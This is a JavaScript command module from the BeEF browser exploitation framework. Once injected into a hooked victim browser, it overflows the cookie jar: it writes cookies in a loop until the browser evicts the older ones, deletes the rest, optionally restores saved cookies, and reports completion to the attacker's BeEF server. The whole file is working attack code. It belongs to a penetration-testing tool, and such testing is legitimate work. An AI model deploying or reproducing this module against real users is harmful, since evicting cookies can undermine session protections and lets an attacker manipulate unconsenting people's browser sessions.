//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
   var preserveCookies = '<%= @preserveCookies %>'

   var initialtimestamp;
   var currenttimestamp;
   var i = 0;
   var preservedCookies;
	
   function setCookie(cname,cvalue){
      document.cookie = cname + "=" + cvalue;
   }

   function getCookie(cname){
      var name = cname + "=";
      var ca = document.cookie.split(';');
		
      for(var i=0; i<ca.length; i++){
         var c = ca[i].trim();
         if (c.indexOf(name)==0) return c.substring(name.length,c.length);
      }
      return "";
   }
 
   function deleteAllCookies(){
      var cookies = document.cookie.split(";");

      if (cookies.length > 0){
         var cookie = cookies[0];
         var eqPos = cookie.indexOf("=");
         var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;

         document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
         if (cookies.length > 1){
            //Timeout needed because otherwise cookie write loop freezes render thread
            setTimeout(deleteAllCookies,1);
         }
         else{
            if (preserveCookies){
               var pc = preservedCookies.split(';');

               for(var i=0; i<pc.length; i++){
                  var c = pc[i].trim();
                  document.cookie = c;
               }
            }
            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'Attempt to overflow the Cookie Jar completed');
         }
      }
   }

   function overflowCookie() {
      if(getCookie(initialtimestamp) === "BeEF") {
         currenttimestamp = Date.now();
         setCookie(currenttimestamp,"BeEF");
         //Timeout needed because otherwise cookie write loop freezes render thread
         setTimeout(overflowCookie, 1);
      }
      else{
         deleteAllCookies();
      }
   }

   function overflowCookieJar(){
      preservedCookies = document.cookie;
      initialtimestamp = Date.now();
      setCookie(initialtimestamp,"BeEF");
      overflowCookie();
   }

   overflowCookieJar();
 
});

